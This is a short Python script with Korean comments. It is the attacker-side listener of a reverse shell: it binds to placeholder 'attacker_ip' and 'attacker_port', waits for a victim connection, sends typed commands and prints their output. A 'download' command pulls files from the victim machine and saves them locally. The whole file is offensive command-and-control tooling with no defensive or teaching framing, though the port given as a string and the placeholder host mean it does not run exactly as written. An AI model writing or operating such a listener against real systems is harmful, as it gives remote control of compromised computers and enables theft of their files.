import socket

# 리버스 쉘이 연결될 IP 주소와 포트 번호 
bind_ip = "attacker_ip"
bind_port = "attacker_port"

# 소켓 객체 생성
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))

# 연결 대기
server.listen(5)
print(f"[*] Listening on {bind_ip}:{bind_port}")

# 연결 수락
client_socket, addr = server.accept()
print(f"[*] Accepted connection from {addr}")

# 파일 저장 
def save_file(file_data, file_name):
    with open(file_name, "wb") as f:
        f.write(file_data)

try:
    while True:
        command = input("Enter command: ")
        if command.lower() == "exit":
            client_socket.send(command.encode("utf-8"))
            break
        # 명령어 전송
        client_socket.send(command.encode("utf-8"))
        
        # 파일 다운로드
        if command.lower().startswith("download "):
            file_data = b""
            while True:
                data = client_socket.recv(4096)
                if data.endswith(b"DONE"):
                    file_data += data[:-4]
                    break
                file_data += data
            # \ => . C: => None 으로 치환 # 즉 파일 경로 적절히 치환
            file_name = command[9:].strip().replace("\\", ".").replace("C:", "")
            save_file(file_data, file_name)

            print(f"[*] Received and saved file as {file_name}")
        else:
            # 명령어 실행 결과
            result = client_socket.recv(4096).decode("utf-8")
            print(result)
except KeyboardInterrupt: # Ctrl + c
    print("Connection closed by user.")
finally:
    client_socket.close()
    server.close()